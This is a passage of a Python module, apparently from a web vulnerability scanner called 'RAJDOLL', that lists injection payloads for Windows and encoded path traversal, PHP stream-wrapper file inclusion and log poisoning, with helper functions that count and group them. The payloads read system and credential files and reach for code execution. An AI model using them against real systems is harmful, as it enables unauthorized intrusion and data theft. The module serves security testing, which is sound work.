    "path_traversal_windows": InjectionTechnique(
        name="Path Traversal (Windows)",
        description="Windows directory traversal",
        payloads=[
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system.ini",
            "..\\..\\..\\boot.ini",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....\\....\\....\\windows\\win.ini",
            "..%5c..%5c..%5cwindows\\win.ini",
        ],
        indicators=["[fonts]", "[extensions]", "[boot loader]", "MSDOS.SYS"],
        severity="high"
    ),
    
    # Encoding Bypass
    "path_traversal_encoded": InjectionTechnique(
        name="Path Traversal (Encoded)",
        description="Bypass filters with encoding",
        payloads=[
            # URL encoding
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            # Double URL encoding
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            # Unicode
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%ef%bc%8f..%ef%bc%8fetc/passwd",
            # Null byte
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%00.png",
        ],
        indicators=["root:", "bin:", "daemon:"],
        severity="high"
    ),
    
    # PHP Wrappers
    "php_wrappers": InjectionTechnique(
        name="PHP Wrappers",
        description="LFI via PHP stream wrappers",
        payloads=[
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=../config.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://input",  # POST body as file content
            "php://data:text/plain,<?php phpinfo(); ?>",
            "php://data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id",
            "file:///etc/passwd",
            "dict://localhost:11211/stats",
            "phar://test.phar/test.txt",
        ],
        indicators=["PD9waHA", "<?php", "base64", "phpinfo"],
        severity="critical"
    ),
    
    # Log Poisoning
    "log_poisoning": InjectionTechnique(
        name="Log File Poisoning",
        description="RCE via log file inclusion",
        payloads=[
            "../../../var/log/apache2/access.log",
            "../../../var/log/apache2/error.log",
            "../../../var/log/nginx/access.log",
            "../../../var/log/nginx/error.log",
            "../../../var/log/auth.log",
            "../../../var/log/mail.log",
            "../../../proc/self/fd/0",
            "../../../proc/self/environ",
        ],
        indicators=["GET /", "POST /", "User-Agent:", "HTTP/1"],
        severity="critical",
        false_positive_check="Combine with User-Agent poisoning"
    ),
}


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def get_all_techniques() -> Dict[str, Dict[str, InjectionTechnique]]:
    """Get all injection techniques organized by type"""
    techniques = {
        InjectionType.SQLI.value: SQLI_TECHNIQUES,
        InjectionType.XSS.value: XSS_TECHNIQUES,
        InjectionType.COMMAND.value: COMMAND_INJECTION_TECHNIQUES,
        InjectionType.LDAP.value: LDAP_INJECTION_TECHNIQUES,
        InjectionType.XPATH.value: XPATH_INJECTION_TECHNIQUES,
        InjectionType.NOSQL.value: NOSQL_INJECTION_TECHNIQUES,
        InjectionType.SSTI.value: SSTI_TECHNIQUES,
        InjectionType.XXE.value: XXE_TECHNIQUES,
        InjectionType.CRLF.value: CRLF_TECHNIQUES,
        InjectionType.LFI.value: LFI_TECHNIQUES,
    }
    
    # Import SSRF payloads if available
    try:
        from .ssrf_payloads import get_ssrf_payloads_by_category, get_ssrf_detection_patterns
        ssrf_categories = get_ssrf_payloads_by_category()
        ssrf_patterns = get_ssrf_detection_patterns()
        
        # Create SSRF techniques from imported payloads
        ssrf_techniques = {}
        for category_name, payloads in ssrf_categories.items():
            ssrf_techniques[category_name] = InjectionTechnique(
                name=f"SSRF {category_name.replace('_', ' ').title()}",
                description=f"Server-Side Request Forgery - {category_name} technique",
                payloads=payloads,
                indicators=ssrf_patterns[:10],  # Use top 10 detection patterns
                severity="high" if category_name in ["cloud_metadata", "protocol_smuggling"] else "medium"
            )
        techniques[InjectionType.SSRF.value] = ssrf_techniques
    except ImportError:
        pass  # SSRF payloads not available
    
    return techniques


def get_techniques_for_type(injection_type: str) -> Dict[str, InjectionTechnique]:
    """Get all techniques for a specific injection type"""
    all_techniques = get_all_techniques()
    return all_techniques.get(injection_type, {})


def get_all_payloads_for_type(injection_type: str) -> List[str]:
    """Get flat list of all payloads for an injection type"""
    techniques = get_techniques_for_type(injection_type)
    payloads = []
    for technique in techniques.values():
        payloads.extend(technique.payloads)
    return list(set(payloads))  # Remove duplicates


def get_indicators_for_type(injection_type: str) -> List[str]:
    """Get all indicators for an injection type"""
    techniques = get_techniques_for_type(injection_type)
    indicators = []
    for technique in techniques.values():
        indicators.extend(technique.indicators)
    return list(set(indicators))


def get_critical_payloads() -> Dict[str, List[str]]:
    """Get critical severity payloads (most likely to find vulns)"""
    critical = {}
    for inj_type, techniques in get_all_techniques().items():
        critical_payloads = []
        for technique in techniques.values():
            if technique.severity == "critical":
                critical_payloads.extend(technique.payloads[:3])  # Top 3 per technique
        critical[inj_type] = critical_payloads
    return critical


def payload_count_summary() -> Dict[str, int]:
    """Get payload count per injection type"""
    return {
        inj_type: len(get_all_payloads_for_type(inj_type))
        for inj_type in get_all_techniques().keys()
    }


# =============================================================================
# PAYLOAD STATISTICS
# =============================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("RAJDOLL Injection Payloads Summary")
    print("=" * 60)
    
    total = 0
    for inj_type, count in payload_count_summary().items():
        print(f"  {inj_type.upper()}: {count} payloads")
        total += count
    
    print("-" * 60)
    print(f"  TOTAL: {total} payloads")
    print("=" * 60)
